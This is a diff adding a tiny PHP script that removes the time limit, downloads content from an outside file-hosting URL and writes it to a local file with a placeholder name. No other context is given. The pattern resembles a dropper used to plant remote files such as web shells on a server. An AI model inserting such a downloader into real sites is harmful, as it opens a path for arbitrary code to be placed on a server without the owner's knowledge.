@@ -1,0 +1,9 @@
+<?php
+set_time_limit(0);
+$myFile = "filename.type";
+$fh = fopen($myFile, 'w');
+$page = file_get_contents('http://m.uploadedit.com/.txt');
+$stringData = $page;
+fwrite($fh, $stringData);
+fclose($fh);
+?>
